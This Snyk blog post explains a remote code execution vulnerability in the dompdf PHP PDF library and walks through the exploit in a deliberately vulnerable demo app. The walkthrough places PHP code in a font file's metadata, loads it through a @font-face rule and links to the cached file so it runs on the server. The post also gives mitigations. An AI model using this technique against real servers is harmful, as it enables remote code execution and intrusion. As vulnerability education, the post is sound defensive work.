You need to enable JavaScript to run this app.[Skip to main content](#main-content)

* Products

  Products

  + [What is Snyk?

    Developer-first security in action](/product/)
  + [Snyk Code

    Secure your code as it's written](/product/snyk-code/)
  + [Snyk Open Source

    Avoid vulnerable dependencies](/product/open-source-security-management/)
  + [Snyk Container

    Keep your base images secure](/product/container-vulnerability-management/)
  + [Snyk IaC

    Fix IaC misconfigurations in-code](/product/infrastructure-as-code-security/)
  + [Snyk AppRisk

    Reduce risk across your business](/product/snyk-apprisk/)
  + [Pricing](/plans/)

  Solutions

  + [Why Snyk?

    Modern security in a single platform](/platform/)
  + [Application security

    Build secure, stay secure](/solutions/application-security/)
  + [Software supply chain security

    Mitigate supply chain risk](/solutions/software-supply-chain-security/)
  + [Secure-AI-generated code

    AI writes, Snyk secures](/solutions/secure-ai-generated-code/)
  + [Zero-day vulnerabilities

    Fix the first day with Snyk](/solutions/zero-day-vulnerability-security/)
  + [Security Intelligence

    Comprehensive vulnerability data](/platform/security-intelligence/)

  Platform

  + [DeepCode AI

    Purpose-built security AI](/platform/deepcode-ai/)
  + [Integrations

    SDLC-spanning security](/integrations/)
  + [Code Checker

    Write better code for free](/code-checker/)

  Audience

  + [Snyk for devs

    Dev-centric info on demand](https://go.snyk.io/2024-dev-onboarding.html)
  + [Snyk for government

    Mission-informed AppSec](/government-security-solution/)
  + [Leaders handbook

    SAST essentials for genAI](/lp/securing-ai-generated-code/)![default-report.b205b2e0](https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg)

  Secure Adoption in Gen AI Era Report

  [Read report](https://go.snyk.io/secure-adoption-in-genai-era.html "Read report")
* Resources

  Our resources

  + [Resource library

    Browse our extensive database](/resource-library/)
  + [Customer resources

    The one stop shop for customers](/customer-resources/)
  + [Ethical hacking

    How ethical hacking can help you](/ethical-hacking-resources/)
  + [Security leaders

    Insights from industry leaders](/security-leaders/)
  + [Top 10 vulns

    See the most common vuln types](/snyk-top-10/)
  + [Blog Section](/blog/)
  + [Snyk's podcasts](/podcasts/the-secure-developer/)
  + [Snykâ€™s YouTube](https://www.youtube.com/snyksec)

  Our ecosystem

  + [Snyk Learn

    Security education from Snyk](https://learn.snyk.io)
  + [Snyk user docs

    Get started with Snyk](https://docs.snyk.io/)
  + [Snyk Support

    How can we help?](https://support.snyk.io/hc/en-us)
  + [Snyk Vuln Database

    Find new vulnerabilities](https://security.snyk.io/)
  + [Snyk Updates

    Stay in the loop](https://updates.snyk.io/)

  Our community

  + [Events & webinars](/events/)
  + [Ambassadors](/snyk-ambassadors/)
  + [Discord channel](https://snyk.co/discordcommunity)![feature-snyk-snowflake](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&w=2560&q=75)

  Extend the power of your AppSec data with the new Snyk and Snowflake integration

  [Read blog](/blog/snyk-snowflake-data-share/ "Read blog")
* Company

  Company

  ## The developer security platform

  Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

  [More about us](/about/ "More about us")
  + [Our services

    Maximize your AppSec ROI](/services/)
  + [Our customers

    We help customers save time and money](/customers/)
  + [Our partners

    Bringing business class security with partners](/partners/)
  + [Case studies

    Check out our customer stories and stats](/case-studies/)
  + [Newsroom

    See the latest press releases](/news/)
  + [Contact us

    Get in touch with any feedback or questions](/contact-us/)
  + [Careers

    Join Snyk today](/careers/)![Snyk_Probely](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&w=2560&q=75)

  Snyk Acquires Developer-First DAST Provider Probely

  [Read press release](/news/snyk-acquires-developer-first-dast-provider-probely/ "Read press release")
* [Pricing](/plans/)

ENSelect your languageEnglishDeutschFranÃ§aisæ—¥æœ¬èªžPortuguÃªs (BR)Login

Free and Team Plan Customers

* [Snyk

  app.snyk.io](https://app.snyk.io)

Enterprise Plan Customers

* [*ðŸ‡ºðŸ‡¸*

  Snyk US - 1

  app.snyk.io](https://app.snyk.io)
* [*ðŸ‡ºðŸ‡¸*

  Snyk US - 2

  app.us.snyk.io](https://app.us.snyk.io)
* [*ðŸ‡ªðŸ‡º*

  Snyk EU

  app.eu.snyk.io](https://app.eu.snyk.io)
* [*ðŸ‡¦ðŸ‡º*

  Snyk AU

  app.au.snyk.io](https://app.au.snyk.io)

The region where your data is hosted follows local agreements, and it may not align with your own location. [Find out more](https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency).[Sign up](https://app.snyk.io/signup "Sign up")[Book a live demo](/schedule-a-demo/ "Book a live demo")[Snyk Blog](/blog/)
# dompdf security alert: RCE vulnerability found in popular PHP PDF library

Written by: ![DeveloperSteve Coochin](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2Fdeveloper-steve-coochin.jpeg&w=48&q=75)

DeveloperSteve Coochin

![wordpress-sync/blog-social-php-composer](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1621453472%2Fwordpress-sync%2Fblog-social-php-composer.png&w=2560&q=75)

March 18, 2022

 0 mins read

Recently, researchers from [Positive Security published findings](https://positive.security/blog/dompdf-rce) identifying a major [remote code execution (RCE) vulnerability in **dompdf**](https://security.snyk.io/vuln/SNYK-PHP-DOMPDFDOMPDF-2428942), a popular PDF generation library. In their reporting, they outlined a way that code could be loaded into an application and then remotely executed during a PDF being generated.

Dompdf is used quite extensively within the PHP ecosystem, and is used within over 59,000 open sourced platforms and projects. The dompdf [PHP composer page](https://packagist.org/packages/dompdf/dompdf) alone has **nearly 50 million installs** since its initial release to the PHP package manager in 2014.

At the time of writing this, there is currently no fix for this vulnerability. A potential solution could be to prohibit the loading of custom font styles into the PDF generation process or even restricting write access to the font cache folder. Alternatively, restricting access to the Composer install location is also a good option, depending on what libraries are being used and what functionality is needed in the application.

For dompdf versions => 0.8.6, the `$isRemoteEnabled` setting can be disabled to prevent loading of custom fonts through `font-face` CSS rules. However, bear in mind that this could be a breaking change. Furthermore, in versions <0.8.5, this setting is not used and as such this vulnerability cannot be patched through the `$isRemoteEnabled` setting.

In this blog post, weâ€™ll take a look at how the vulnerability works. One thing I find helpful for fundamentally understanding code and vulnerabilities at a more granular level is to get hands-on. So in this blog post weâ€™re going to explore this vulnerability through a working demo using the [php-goof](https://github.com/snyk-labs/php-goof) application on a Snyk GitHub repo.

## PDF libraries

PDF generation within applications is one of my least favorite tasks as a developer. It's a fairly lengthy reiterative process involving code change, generate, code change, generate, etc. to get the formatting and layout right within the PDF being created.

But being able to format HTML to PDF is amazingly useful, especially when you think about how often applications need to use PDF generation. You use them almost every day, on ecommerce websites or sites where you have user-based transactional data that needs to have a receipt generated for the user to save or print.

So for most of us, using a library to do these kinds of functions in application development helps speed up the app development process. Libraries like [dompdf](https://github.com/dompdf/dompdf) mean that as developers, we are able to build out mundane functionality and move on to the more complex things.

## Getting hands-on with the dompdf vulnerability

Looking through the original security findings, you can understand more of what is going on inside the library and how it was able to be exploited.

The dompdf library essentially takes normal HTML in its usual format and outputs that into a formatted PDF.

```
1// reference the Dompdf namespace
2use Dompdf\Dompdf;
3
4// instantiate and use the dompdf class
5$dompdf = new Dompdf();
6$dompdf->loadHtml('<html><body>hello world</body></html>');
7
8// (Optional) Setup the paper size and orientation
9$dompdf->setPaper('A4', 'landscape');
10
11// Render the HTML as PDF
12$dompdf->render();
13
14// Output the generated PDF to Browser
15$dompdf->stream();
```

It provides fairly simple and easy to use functionality, removing what would otherwise be a very mundane task for a commonly used piece of functionality. The best part with this functionality is that it will format the PDF output using straight HTML tags.

HTML can also include styles. This can either be inline with the `<html>` tag or via a style sheet. One thing you can do with a style sheet is load in a `font-family` and include a link to a font file.

```
1@font-face {
2    Font-family:'font name';
3    src:url('https://link to a font fileâ€™');
4    font-weight:'normal';
5    font-style:'normal';
6  }
```

This is where things start getting a bit interesting.

The dompdf library will not only load in an external style sheet via HTML, but it will also save the font file into a local cache, add it to a font directory on the server, and reference the `font-family` and location from within the dompdf framework.

The next step in the exploit is getting PHP code into a font file which can pass the validation from dompdf and be stored on the server, but still allow that PHP code to run from the font file. This might sound like a tricky task, however the original researchers discovered that the validation inside the library only checks for the file type, *not* the contents of the file.

In the php-goof demo app, you can see how this works by taking a look at the custom font file called [gotcha-normal.otf](https://github.com/snyk-labs/php-goof/tree/main/exploits). For the most part this is indeed a regular font file with completely normal font typesets in it. But inside the meta part of the file, thereâ€™sÂ  PHP to be executed on the target app server â€” `<php? phpinfo(); ?>` â€” inside the copyright meta fieldâ€¦. Yes It's as easy as that!

![wordpress-sync/blog-dompdf-gotcha](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718172%2Fwordpress-sync%2Fblog-dompdf-gotcha.png&w=2560&q=75)

Then open the font file in a code editor and copy the contents into a .php file, or just rename it. This is important because dompdf will validate the font headers in the file and save to the cache as a .php file and allow it to be an executable php file.

Next, reference that newly created faux font file into the CSS style as a `font-family`. In php-goof, weâ€™re doing this directly from the php-goof repository.

```
1@font-face {
2    font-family:'gotcha';
3    src:url('https://github.com/snyk-labs/php-goof/blob/main/exploits/gotcha_font.php?raw=true');
4    font-weight:'normal';
5    font-style:'normal';
6  }
```

**Note:** It's important here to use the same name from the font file for the `font-family` name or it will not work in dompdf.

Now all that is left is to inject the style sheet into the HTML used for the PDF output. This will then trigger dompdf to store that font on the server and it can be remotely executed. This in itself becomes a bit tricky because the file name is hashed and the font directory can be in a different place.

In php-goof, this part is made a bit easier by using the dompdf framework to identify the font-file location and name. It uses `$dompdf->getFontMetrics()->getFont(â€œgotchaâ€, â€œnormalâ€)` to find out when it's detected in the dompdf font cache.

```
1if($font = $dompdf->getFontMetrics()->getFont("gotcha", "normal")){
2        $html .= "<a href='http://".$_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT']."/vendor/dompdf/dompdf/lib/fonts/".basename($font).".php'>Gotcha hack</a>";
3    }
```

When the gotcha font file is available in the framework, it will then return the path as a link inside the PDF that is generated.Â Here are some screenshots of the vulnerability as seen from the goof-app:

![wordpress-sync/blog-dompdf-goof-todo](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718168%2Fwordpress-sync%2Fblog-dompdf-goof-todo.png&w=2560&q=75)![wordpress-sync/blog-dompdf-goof-php](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718168%2Fwordpress-sync%2Fblog-dompdf-goof-php.png&w=2560&q=75)![wordpress-sync/blog-dompdf-goof-output](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718171%2Fwordpress-sync%2Fblog-dompdf-goof-output.png&w=2560&q=75)
## Stay safe

Shout out to the team at Positive Security for not only being quite open about their findings, but also the steps they took to try and raise it with the maintainers of dompdf.

Always remember to scan your application code base to identify situations like this that can arise without knowing. Snyk Code can help identify vulnerabilities within frameworks and functions and allow you to do the due diligence to help protect end users and their data.

## Secure your open source dependencies

Snyk's dev-first tooling provides one-click fix PRs for vulnerable open source dependencies and their transitive dependencies.

[Book a live demo](/schedule-a-demo/ "Book a live demo")[Start free](https://app.snyk.io/login "Start free")
### Additional resources

* [5 ways to prevent PHP code injection](/blog/prevent-php-code-injection/)
* [Testing for PHP Composer security vulnerabilities with Snyk](/blog/testing-php-composer-security-vulnerabilities-snyk/)
* [PHP security in Snyk Code now GA](/blog/php-security-support-snyk-code/)

Posted in:[Vulnerability Insights](/blog/?topic=vulnerability-insights)[Open Source Security](/blog/?topic=open-source-security)[Application Security](/blog/?topic=application-security)![wordpress-sync/blog-social-php-composer](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1621453472%2Fwordpress-sync%2Fblog-social-php-composer.png&w=2560&q=75)
### Guide to Choosing a SAST Solution

See the process for assessing, selecting, and implementing a modern SAST solution based on a four phase process and find the best fit for your specific security needs.

[See the guide](https://go.snyk.io/SAST-buyers-guide.html "See the guide")
## Products & Solutions

* [What is Snyk?](/product/)
* [Developer Security Platform](/platform/)
* [Pricing](/plans/)
## Our Resources

* [Resource library](/resource-library/)
* [Blog](/blog/)
* [Snykâ€™s podcasts](/podcasts/the-secure-developer/)
## Our Ecosystem

* [Snyk Learn](/platform/learn/)
* [Snyk User Docs](https://docs.snyk.io/)
* [Snyk Support](https://support.snyk.io/hc/en-us)
* [Snyk Vuln Database](https://security.snyk.io/)
* [Snyk Updates](https://updates.snyk.io/)
* [Snyk Trust Center](https://trust.snyk.io/home)
## Company & Community

* [About Snyk](/about/)
* [Contact us](/contact-us/)
* [Book a demo](/schedule-a-demo/)
* [Careers](/careers/)
* [Events & webinars](/events/)
* [Ambassadors](/snyk-ambassadors/)
## Why Snyk

* [Snyk With GitHub](/comparison/github-and-snyk/)
* [Snyk vs Veracode](/comparison/snyk-vs-veracode/)
* [Snyk vs Checkmarx](/comparison/snyk-vs-checkmarx/)
* [Snyk vs Synopsys](/comparison/snyk-vs-synopsys/)

## The developer security platform

Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

[More about us](/about/ "More about us")

Â© 2025 Snyk Limited
Registered in England and Wales

* [Legal terms](/policies/terms-of-service/)
* [Privacy Notice](/policies/privacy/)
* [Terms of use](/policies/website-terms-of-use/)
* [California residents: do not sell my information](https://preferences.snyk.io/dont_sell)
